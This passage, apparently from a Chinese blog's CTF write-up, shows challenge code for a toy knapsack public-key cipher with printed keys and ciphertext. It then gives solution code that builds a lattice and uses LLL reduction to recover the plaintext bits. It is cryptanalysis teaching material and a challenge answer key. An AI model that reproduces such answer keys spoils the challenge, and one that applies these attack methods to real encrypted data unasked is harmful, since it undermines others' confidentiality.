class="attribute">pk</span>.append(int(ai))</span><br><span class="line">    <span class="attribute">return</span> pk,sk</span><br><span class="line"><span class="attribute">Pk</span>,Sk=keygen()</span><br><span class="line"><span class="attribute">print</span>(Pk)</span><br><span class="line"><span class="attribute">print</span>(Sk)</span><br><span class="line"><span class="attribute">def</span> Encrypt(plain,pk):</span><br><span class="line">    <span class="attribute">mbin</span>=bin(plain)[<span class="number">2</span>:]</span><br><span class="line">    <span class="attribute">c</span>=<span class="number">0</span></span><br><span class="line">    <span class="attribute">mbin</span>=pad(mbin,Baglenth)</span><br><span class="line">    <span class="attribute">for</span> i in range(Baglenth):</span><br><span class="line">        <span class="attribute">c</span>=c+int(mbin[i])*pk[i]</span><br><span class="line">    <span class="attribute">return</span> c</span><br><span class="line"><span class="attribute">c</span>=Encrypt(message,Pk)</span><br><span class="line"><span class="attribute">print</span>(c)</span><br><span class="line"><span class="comment"># [13427720507293490146512325883268574617159432219330328705146993381673927145360640901644288, 20141580760940235219768488824902861925739148328995493057720490072510890718040961352466432, 10070790380470117609884244412451430962869574164497746528860245036255445359020480676233216, 5035395190235058804942122206225715481434787082248873264430122518127722679510240338116608, 15945418102411019548983386986381432357876825760454765337362054640737788485115761070702592, 7972709051205509774491693493190716178938412880227382668681027320368894242557880535351296, 3986354525602754887245846746595358089469206440113691334340513660184447121278940267675648, 1993177262801377443622923373297679044734603220056845667170256830092223560639470133837824, 14424309138694178868323787569917414139526733829358751538732121796720038925680375968563200, 20639875076640579580674219668227281686922799134009704474513054280033946608200828885925888, 10319937538320289790337109834113640843461399567004852237256527140016973304100414442962944, 5159968769160144895168554917056820421730699783502426118628263570008486652050207221481472, 16007704891873562594096603341796984828024782111081541764461125166678170471385744512385024, 21431572953230271443560627554167067031171823274871099587377555965013012381053513157836800, 24143506983908625868292639660352108132745343856765878498835771364180433335887397480562688, 25499473999247803080658645713444628683532104147713267954564879063764143813304339641925632, 26177457506917391686841648739990888958925484293186962682429432913555999052012810722607104, 13088728753458695843420824369995444479462742146593481341214716456777999526006405361303552, 6544364376729347921710412184997722239731371073296740670607358228388999763003202680651776, 16699902695658164107367531975767435737025117755978699040450672495868427026862242241970176, 8349951347829082053683765987883717868512558877989349520225336247934213513431121120985088, 4174975673914541026841882993941858934256279438994674760112668123967106756715560560492544, 2087487836957270513420941496970929467128139719497337380056334061983553378357780280246272, 1043743918478635256710470748485464733564069859748668690028167030991776689178890140123136, 521871959239317628355235374242732366782034929874334345014083515495888344589445070061568, 260935979619658814177617687121366183391017464937167172507041757747944172294722535030784, 13558188497103319553601134726829257708854940951798912291400514260547899231508002169159680, 20206814755845149923312893246683203471586902695229784850847250511947876761114641986224128, 23531127885216065108168772506610176352952883566945221130570618637647865525917961894756352, 25193284449901522700596712136573662793635874002802939270432302700497859908319621849022464, 12596642224950761350298356068286831396817937001401469635216151350248929954159810924511232, 6298321112475380675149178034143415698408968500700734817608075675124464977079905462255616, 16576881063531180484086914900340282466363916469680696113951031219236159633900593632772096, 21716161039059080388555783333438715850341390454170676762122508991292006962310937718030336, 10858080519529540194277891666719357925170695227085338381061254495646003481155468859015168, 5429040259764770097138945833359678962585347613542669190530627247823001740577734429507584, 2714520129882385048569472916679839481292673806771334595265313623911500870288867214753792, 1357260064941192524284736458339919740646336903385667297632656811955750435144433607376896, 678630032470596262142368229169959870323168451692833648816328405977875217572216803688448, 13767035523528788277583509997853554552321016445176745529555157584662864754146749303488512, 6883517761764394138791754998926777276160508222588372764777578792331432377073374651744256, 16869479388175687215908203382731963255239686330624515087535782777839643333897328227516416, 8434739694087843607954101691365981627619843165312257543767891388919821666948664113758208, 4217369847043921803977050845682990813809921582656128771883945694459910833474332056879104, 2108684923521960901988525422841495406904960791328064385941972847229955416737166028439552, 1054342461760980450994262711420747703452480395664032192970986423614977708368583014219776, 527171230880490225497131355710373851726240197832016096485493211807488854184291507109888, 13691306122733735259260891561123761543022552318246336753389739987577671572452786655199232, 20273373568660357776142771663830455388670708378453497081841863375462762931587034229243904, 10136686784330178888071385831915227694335354189226748540920931687731381465793517114621952, 18496063899458579590548018799226188464327109313943702975607459225539617878257399458955264, 9248031949729289795274009399613094232163554656971851487803729612769808939128699729477632, 4624015974864644897637004699806547116081777328485925743901864806384904469564349864738816, 2312007987432322448818502349903273558040888664242962871950932403192452234782174932369408, 14583724501009651370921577058220211396179876551451810141122459583270153262751728367828992, 7291862250504825685460788529110105698089938275725905070561229791635076631375864183914496, 3645931125252412842730394264555052849044969137862952535280614895817538315687932091957248, 15250686069919696567877523015546101041681916788261804972787300829582696303204606947622912, 7625343034959848283938761507773050520840958394130902486393650414791348151602303473811456, 17240392024773414288481706637155099877579911416395779948343818589069601221161792638550016, 22047916519680197290753179201846124555949387927528218679318902676208727755941537220919296, 24451678767133588791888915484191636895134126183094438044806444719778291023331409512103936, 25653559890860284542456783625364393064726495310877547727550215741563072657026345657696256, 26254500452723632417740717695950771149522679874769102568922101252455463473873813730492416, 26554970733655306355382684731243960191920772156714879989608044007901658882297547766890496, 26705205874121143324203668248890554713119818297687768699951015385624756586509414785089536, 26780323444354061808614160007713851973719341368174213055122501074486305438615348294189056, 13390161722177030904307080003856925986859670684087106527561250537243152719307674147094528, 20122801368382005598665865885197037610589267561373881968927618650295503505014477975191552, 23489121191484492945845258825867093422454066000017269689610802706821678897867879889240064, 11744560595742246472922629412933546711227033000008634844805401353410839448933939944620032, 5872280297871123236461314706466773355613516500004317422402700676705419724466969972310016, 16363860656229051764742983236501961294966190469332487416348343720026637007594125887799296, 8181930328114525882371491618250980647483095234666243708174171860013318503797062943899648, 17518685671350753087698071692394064940900979836663450559234079311680586397259172373594112, 8759342835675376543849035846197032470450489918331725279617039655840293198629586186797056, 17807391925131178418436843806367090852384677178496191344955513209594073744675433995042816, 8903695962565589209218421903183545426192338589248095672477756604797036872337716997521408, 17879568488576284751121536834860347330255601513954376541385871684072445581529499400404992, 8939784244288142375560768417430173665127800756977188270692935842036222790764749700202496, 17897612629437561334292710091983661449723332597818922840493461302692038540743015751745536, 8948806314718780667146355045991830724861666298909461420246730651346019270371507875872768, 4474403157359390333573177522995915362430833149454730710123365325673009635185753937936384, 15664922085973185313298914644766532298374848794057694060208676044510431962953517870612480, 21260181550280082803161783205651840766346856616359175735251331403929143126837399836950528, 24057811282433531548093217486094495000332860527509916572772659083638498708779340820119552, 25456626148510255920558934626315822117325862483085286991533322923493176499750311311704064, 26156033581548618106791793196426485675822363460872972200913654843420515395235796557496320, 26505737298067799199908222481481817455070613949766814805603820803384184842978539180392448, 13252868649033899599954111240740908727535306974883407402801910401692092421489269590196224, 6626434324516949799977055620370454363767653487441703701400955200846046210744634795098112, 3313217162258474899988527810185227181883826743720851850700477600423023105372317397549056, 15084329088422727596506589788361188208101345591190754630497232181885438698046799600418816, 7542164544211363798253294894180594104050672795595377315248616090942719349023399800209408, 3771082272105681899126647447090297052025336397797688657624308045471359674511699900104704, 15313261643346331096075649606813723143172100418229173033959147404409606982616490851696640, 21084351328966655694550150686675436188745482428444915222126567083878730636668886327492608, 10542175664483327847275075343337718094372741214222457611063283541939365318334443163746304, 5271087832241663923637537671668859047186370607111228805531641770969682659167221581873152, 16063264423414322108331094719103004140752617522885943107912814267158768474944251692580864, 21459352719000651200677873242820076687535740980773300259103400515253311382832766747934720, 10729676359500325600338936621410038343767870490386650129551700257626655691416383373967360, 5364838179750162800169468310705019171883935245193325064775850128813327845708191686983680, 16110139597168571546597060038621084203101399841926991237534918446080591068214736745136128, 8055069798584285773298530019310542101550699920963495618767459223040295534107368372568064, 4027534899292142886649265009655271050775349960481747809383729611520147767053684186284032, 2013767449646071443324632504827635525387674980240873904691864805760073883526842093142016, 1006883724823035721662316252413817762693837490120436952345932402880036941763421046571008, 503441862411517860831158126206908881346918745060218476172966201440018470881710523285504, 251720931205758930415579063103454440673459372530109238086483100720009235440855261642752, 125860465602879465207789531551727220336729686265054619043241550360004617720427630821376, 13490650740094929879116220649044438227327797062462856014668614156853929454220854717054976, 6745325370047464939558110324522219113663898531231428007334307078426964727110427358527488, 16800383192317222616291381045529684173991381484946042708814146920887409508915854580908032, 21827912103452101454658016406033416704155122961803350059554066842117631899818568192098304, 24341676559019540873841334086285282969236993700232003734924026802732743095269924997693440, 12170838279509770436920667043142641484618496850116001867462013401366371547634962498846720, 19513139647048375364972659404839895359468680644388329638878000082357112919178122151067648, 9756569823524187682486329702419947679734340322194164819439000041178556459589061075533824, 4878284911762093841243164851209973839867170161097082409719500020589278229794530537766912, 2439142455881046920621582425604986919933585080548541204859750010294639114897265268883456, 14647291735234013606823117096071068077126224759604599307576868386821246702809273536086016, 20751366374910496949923884431304108655722544599132628358935427575084550496765277669687296, 23803403694748738621474268098920628945020704518896642884614707169216202393743279736487936, 11901701847374369310737134049460314472510352259448321442307353584608101196871639868243968, 5950850923687184655368567024730157236255176129724160721153676792304050598435819934121984, 16403145969137082474196609395633653235287020284192409065723831777825952444578550868705280, 21629293491862031383610630581085401234802942361426533238008909270586903367649916335996928, 10814646745931015691805315290542700617401471180713266619004454635293451683824958167998464, 5407323372965507845902657645271350308700735590356633309502227317646725841912479083999232, 2703661686482753922951328822635675154350367795178316654751113658823362920956239541999616, 1351830843241376961475664411317837577175183897589158327375556829411681460478119770999808, 675915421620688480737832205658918788587591948794579163687778414705840730239059885499904, 337957710810344240368916102829459394293795974397289581843889207352920365119529942749952, 168978855405172120184458051414729697146897987198644790921944603676460182559764971374976, 84489427702586060092229025707364848573448993599322395460972301838230091279882485687488, 42244713851293030046114512853682424286724496799661197730486150919115045639941242843744, 21122356925646515023057256426841212143362248399830598865243075459557522819970621421872, 10561178462823257511528628213420606071681124199915299432621537729778761409985310710936, 5280589231411628755764314106710303035840562099957649716310768864889380704992655355468, 2640294615705814377882157053355151517920281049978824858155384432444690352496327677734, 1320147307852907188941078526677575758960140524989412429077692216222345176248163838867, 11376929106527795892898839465621865505177413571970563898745322852504166513570004716585524, 5688464553263897946449419732810932752588706785985281949372661426252083256785002358292762, 2844232276631948973224709866405466376294353392992640974686330713126041628392501179146381, 12798385171189843925916723859561259905445110198204389679873949362959076155178131224239281, 17775461618468791402262730856139156670020488600810264032467758687875593418570946246785731, 20263999842108265140435734354428105052308177802113201208764663350333852050267353758058956, 10131999921054132570217867177214052526154088901056600604382331675166926025133676879029478, 5065999960527066285108933588607026263077044450528300302191165837583463012566838439514739, 13909269013137402581858835720662039848836455726972219343626366925187786847265299854423460, 6954634506568701290929417860331019924418227863486109671813183462593893423632649927211730, 3477317253284350645464708930165509962209113931743054835906591731296946711816324963605865, 13114927659516044762036723391441281698402490467579596610484079872044528696890043116469023, 17933732862631891820322730622079167566499178735497867497772823942418319689426902192900602, 8966866431315945910161365311039583783249589367748933748886411971209159844713451096450301, 15859702248531842394385051581878318608922728185582536066973989992000635263338606182891241, 19306120157139790636496894717297686021759297594499337226017779002396372972651183726111711, 21029329111443764757552816285007369728177582298957737805539673507594241827307472497721946, 10514664555721882378776408142503684864088791149478868902769836753797120913653736248860973, 16633601310734810628692572997610369149342329076447503643915702383294615797808748759096577, 19693069688241274753650655425163711291969098039931821014488635198043363239886255014214379, 21222803876994506816129696638940382363282482521673979699775101605417736960925008141773280, 10611401938497253408064848319470191181641241260836989849887550802708868480462504070886640, 5305700969248626704032424159735095590820620630418494924943775401354434240231252035443320, 2652850484624313352016212079867547795410310315209247462471887700677217120115626017721660, 1326425242312156676008106039933773897705155157604623731235943850338608560057813008860830, 663212621156078338004053019966886948852577578802311865617971925169304280028906504430415, 11707875343451908608306395436341970191724222291109225125339769968980707480996333886881298, 5853937671725954304153197718170985095862111145554612562669884984490353740498166943440649, 14303237868736846591380967785444019265228989074485375473865726498641232211230964106386415, 18527887967242292734994852819080536349912428038950756929463647255716671446597362687859298, 9263943983621146367497426409540268174956214019475378464731823627858335723298681343929649, 16008241024684442623053082131128660804776040511445758424896695820325223202631221306630915, 19380389545216090750830909991922857119685953757430948404979131916558666942297491287981548, 9690194772608045375415454995961428559842976878715474202489565958279333471148745643990774, 4845097386304022687707727497980714279921488439357737101244782979139666735574372821995387, 13798817726025880783158232675348883857258677721386937743153175495965888708769067045663784, 6899408863012940391579116337674441928629338860693468871576587747982944354384533522831892, 3449704431506470195789558168837220964314669430346734435788293873991472177192266761415946, 1724852215753235097894779084418610482157334715173367217894146936995736088596133380707973, 12238695140750486988251758468567831958376600859294752801477857474893923385279947325020077, 17495616603249112933430248160642442696486233931355445593269712743843017033621854297176129, 20124077334498425906019493006679748065541050467385791989165640378317563857792807783254155, 21438307700123082392314115429698400750068458735400965187113604195554837269878284526293168, 10719153850061541196157057714849200375034229367700482593556802097777418634939142263146584, 5359576925030770598078528857424600187517114683850241296778401048888709317469571131573292, 2679788462515385299039264428712300093758557341925120648389200524444354658734785565786646, 1339894231257692649519632214356150046879278670962560324194600262222177329367392782893323, 12046216148502715764064185033536601740737572837189349354628084137507144005665577026112752, 6023108074251357882032092516768300870368786418594674677314042068753572002832788513056376, 3011554037125678941016046258384150435184393209297337338657021034376786001416394256528188, 1505777018562839470508023129192075217592196604648668669328510517188393000708197128264094, 752888509281419735254011564596037608796098302324334334664255258594196500354098564132047, 11752713287514579306931374708656545521695982652870236359862911635693153591158929916732114, 5876356643757289653465687354328272760847991326435118179931455817846576795579464958366057, 14314447354752514266037212603522663097721929164925628282496511915319343738771613113849119, 18533492710250126572322975228119858266158898084170883333779039964055727210367687191590650, 9266746355125063286161487614059929133079449042085441666889519982027863605183843595795325, 16009642210436401082385112733388491283837658022750790025975543997409987143573802432563753, 19381090138092069980496925293052772359216762513083464205518556005101048912768781850947967, 21066814101919904429552831572884912896906314758249801295290062008946579797366271560140074, 10533407050959952214776415786442456448453157379124900647645031004473289898683135780070037, 16642972558353845546692576819579754941524512191270519516353299508632700290323448524701109, 19697755312050792212650657336148404188060189597343328950707433760712405486143604897016645, 21225146688899265545629697594432728811328028300379733667884500886752258084053683083174413, 21988842377323502212119217723574891122961947651897936026473034449772184383008722176253297, 22370690221535620545363977788145972278778907327657037205767301231282147532486241722792739, 22561614143641679711986357820431512856687387165536587795414434622037129107225001496062460, 11280807071820839855993178910215756428343693582768293897707217311018564553612500748031230, 5640403535910419927996589455107878214171846791384146948853608655509282276806250374015615, 14196470800829079403302663653912465824383856897400142666957588334150696479385005821673898, 7098235400414539701651331826956232912191928448700071333478794167075348239692502910836949, 14925386733081139290130034839836643173393897726058104859270181089933729460828132090084565, 18838962399414439084369386346276848303994882364737121622165874551362920071395946679708373, 20795750232581088981489062099496950869295374684076630003613721282077515376679853974520277, 21774144149164413930048899976107002151945620843746384194337644647434813029321807621926229, 22263341107456076404328818914412027793270743923581261289699606330113461855642784445629205, 22507939586601907641468778383564540613933305463498699837380587171452786268803272857480693, 22630238826174823260038758118140797024264586233457419111221077592122448475383517063406437, 22691388445961281069323747985428925229430226618436778748141322802457279578673639166369309, 22721963255854509973966242919072989332013046810926458566601445407624695130318700217850745, 22737250660801124426287490385895021383304456907171298475831506710208402906141230743591463, 22744894363274431652448114119306037408950161955293718430446537361500256794052496006461822, 11372447181637215826224057059653018704475080977646859215223268680750128397026248003230911, 17062492623692477352416397456185036069535473990531498800142418346771119539495004636281546, 8531246311846238676208198728092518034767736995265749400071209173385559769747502318140773, 15641892188796988777408468290404785734681801999340943892566388593088835225855631793736477, 19197215127272363828008603071560919584638834501378541138813978302940472953909696531534329, 20974876596510051353308670462138986509617350752397339761937773157866291817936728900433255, 21863707331128895115958704157428019972106608877906739073499670585329201249950245084882718, 10931853665564447557979352078714009986053304438953369536749835292664600624975122542441359, 16842195865656093218294044965715531710324585721184753960905701652728355653469441905886770, 8421097932828046609147022482857765855162292860592376980452850826364177826734720952943385, 15586817999287892743877880167787409644879079932004257682757209419578144254349241111137783, 19169678032517815811243309010252231539737473467710198033909388716185127468156501190234982, 9584839016258907905621654505126115769868736733855099016954694358092563734078250595117491, 16168688541003323392115196178921584602232301868635618701008131185442337208021005932224836, 8084344270501661696057598089460792301116150934317809350504065592721168604010502966112418, 4042172135250830848028799044730396150558075467158904675252032796360584302005251483056209, 13397355100499284863318768448723724792576971235287521530156800404576347491984506376194195, 18074946583123511870963753150720389113586419119351829957609184208684229086974133822763188, 9037473291561755935481876575360194556793209559675914978804592104342114543487066911381594, 4518736645780877967740938287680097278396604779837957489402296052171057271743533455690797, 13635637355764308423174838070198575356496235891627047937231932032481583976853647362511489, 18194087710756023650891787961457814395546051447521593161146750022636847329408704315921835, 20473312888251881264750262907087433915070959225468865773104159017714479005686232792627008, 10236656444125940632375131453543716957535479612734432886552079508857239502843116396313504, 5118328222062970316187565726771858478767739806367216443276039754428619751421558198156752, 2559164111031485158093782863385929239383869903183608221638019877214309875710779099078376, 1279582055515742579046891431692964619691934951591804110819009938607154937855389549539188, 639791027757871289523445715846482309845967475795902055409504969303577468927694774769594, 319895513878935644761722857923241154922983737897951027704752484651788734463847387384797, 11536216789813337261685230355320147294759425370657044706383160248721949708213804328358489, 17144377427780538070146984104018600364677646187036591545722364130757030195088782798845335, 19948457746764138474377860978367826899636756595226364965391966071774570438526272034088758, 9974228873382069237188930489183913449818378297613182482695983035887285219263136017044379, 16363383469564904057898834170950483442207122650514660433878775524339697950613448643188280, 8181691734782452028949417085475241721103561325257330216939387762169848975306724321594140, 4090845867391226014474708542737620860551780662628665108469693881084924487653362160797070, 2045422933695613007237354271368810430275890331314332554234846940542462243826681080398535, 12398980499721675942923046062042931932435878667365235469648207476667286462895221174865358, 6199490249860837971461523031021465966217939333682617734824103738333643231447610587432679, 14476014157804288425035130441869259700406903168549378059942835875562876956705685928382430, 7238007078902144212517565220934629850203451584274689029971417937781438478352842964191215, 14995272572324941545563151536825841642399659293845413707516492975286774580158302116761698, 7497636286162470772781575768412920821199829646922706853758246487643387290079151058380849, 15125087175955104825695156810564987127897848325169422619409907250217748986021456163856515, 18938812620851421852151947331641020281246857664292780502235737631504929833992608716594348, 9469406310425710926075973665820510140623428832146390251117868815752464916996304358297174, 4734703155212855463037986832910255070311714416073195125558934407876232458498152179148587, 13743620610480297170823362342813654252453790709744666755310251210334171570230956724240384, 6871810305240148585411681171406827126226895354872333377655125605167085785115478362120192, 3435905152620074292705840585703413563113447677436166688827562802583542892557739181060096, 1717952576310037146352920292851706781556723838718083344413781401291771446278869590530048, 858976288155018573176460146425853390778361919359041672206890700645885723139434795265024, 429488144077509286588230073212926695389180959679520836103445350322942861569717397632512, 214744072038754643294115036606463347694590479839760418051722675161471430784858698816256, 107372036019377321647057518303231673847295239919880209025861337580735715392429349408128, 53686018009688660823528759151615836923647619959940104512930668790367857696214674704064, 26843009004844330411764379575807918461823809979970052256465334395183928848107337352032, 13421504502422165205882189787903959230911904989985026128232667197591964424053668676016, 6710752251211082602941094893951979615455952494992513064116333598795982212026834338008, 3355376125605541301470547446975989807727976247496256532058166799397991106013417169004, 1677688062802770650735273723487994903863988123748128266029083399698995553006708584502, 838844031401385325367636861743997451931994061874064133014541699849497776503354292251]</span></span><br><span class="line"><span class="comment"># [372992427307339981616536686110115630075342113098010788080347982669869622759400031649792, 284117116837182934114178639859989682847967251175497623662086047895218803240335140835099, 1605652832106941558090105598761930941083559723, 1020259092832776008725259110973662538898604019]</span></span><br><span class="line"><span class="comment"># 1475864207352419823225329328555476398971654057144688193866218781853021651529290611526242518</span></span><br></pre></td></tr></table></figure><h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><ul><li><a href="https://jayxv.github.io/2020/06/08/密码学学习笔记之knapsack/">学习参考</a></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Pk = []</span><br><span class="line">Sk = []</span><br><span class="line"><span class="keyword">c</span> = </span><br><span class="line"><span class="keyword">ma</span> = []</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(Pk)):</span><br><span class="line">    tmp = (<span class="string">&#x27;0 &#x27;</span> * <span class="built_in">len</span>(Pk)).<span class="keyword">split</span>(<span class="string">&#x27; &#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    tmp[i] = <span class="number">2</span></span><br><span class="line">    tmp.<span class="keyword">append</span>(Pk[i])</span><br><span class="line">    <span class="keyword">ma</span>.<span class="keyword">append</span>(tmp)</span><br><span class="line">tmp = (<span class="string">&#x27;1 &#x27;</span> * <span class="built_in">len</span>(Pk)).<span class="keyword">split</span>(<span class="string">&#x27; &#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">tmp.<span class="keyword">append</span>(<span class="keyword">c</span>)</span><br><span class="line"><span class="keyword">ma</span>.<span class="keyword">append</span>(tmp)</span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">m</span><span class="variable">a:</span></span><br><span class="line">    <span class="keyword">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Pk = []</span><br><span class="line">Sk = []</span><br><span class="line"><span class="keyword">c</span> = </span><br><span class="line"><span class="keyword">ma</span> = []</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(Pk)):</span><br><span class="line">    tmp = (<span class="string">&#x27;0 &#x27;</span> * <span class="built_in">len</span>(Pk)).<span class="keyword">split</span>(<span class="string">&#x27; &#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    tmp = [<span class="keyword">int</span>(i) <span class="keyword">for</span> i in tmp]</span><br><span class="line">    tmp[i] = <span class="number">2</span></span><br><span class="line">    tmp.<span class="keyword">append</span>(Pk[i])</span><br><span class="line">    <span class="keyword">ma</span>.<span class="keyword">append</span>(tmp)</span><br><span class="line">tmp = (<span class="string">&#x27;1 &#x27;</span> * <span class="built_in">len</span>(Pk)).<span class="keyword">split</span>(<span class="string">&#x27; &#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">tmp = [<span class="keyword">int</span>(i) <span class="keyword">for</span> i in tmp]</span><br><span class="line">tmp.<span class="keyword">append</span>(<span class="keyword">c</span>)</span><br><span class="line"><span class="keyword">ma</span>.<span class="keyword">append</span>(tmp)</span><br><span class="line"><span class="keyword">ma</span> = matrix(<span class="keyword">ma</span>)</span><br><span class="line">L = <span class="keyword">ma</span>.LLL()</span><br><span class="line">with <span class="keyword">open</span>(<span class="string">&#x27;/Users/wenhui/Desktop/LLL_data3333.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> <span class="keyword">file</span>:</span><br><span class="line">    <span class="keyword">for</span> i in L:</span><br><span class="line">        <span class="keyword">file</span>.writelines(str(i) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;0ver&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span 